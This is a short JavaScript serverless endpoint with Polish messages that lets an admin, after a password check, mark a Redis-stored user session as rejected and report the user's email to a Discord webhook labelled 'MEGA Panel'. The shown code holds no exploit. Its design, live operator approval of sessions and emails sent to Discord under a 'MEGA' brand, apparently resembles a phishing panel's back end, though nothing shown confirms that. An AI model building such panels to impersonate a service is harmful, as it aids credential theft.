// api/admin-reject.js
import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { sessionId, adminPassword } = req.body;

    if (!sessionId) {
        return res.status(400).json({ error: 'Brak sessionId' });
    }

    if (adminPassword !== process.env.ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
    }

    const data = await redis.get(`session:${sessionId}`);
    if (!data) {
        return res.status(404).json({ error: 'Sesja nie istnieje' });
    }

    const session = JSON.parse(data);
    session.rejected = true;

    await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));

    await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: 'MEGA Panel',
            embeds: [{
                title: '❌ Admin odrzucił użytkownika',
                description: `Użytkownik ${session.email} został odrzucony.`,
                color: 0xEF4444
            }]
        })
    });

    return res.status(200).json({ 
        success: true, 
        message: 'Użytkownik odrzucony!',
        rejected: true
    });
}
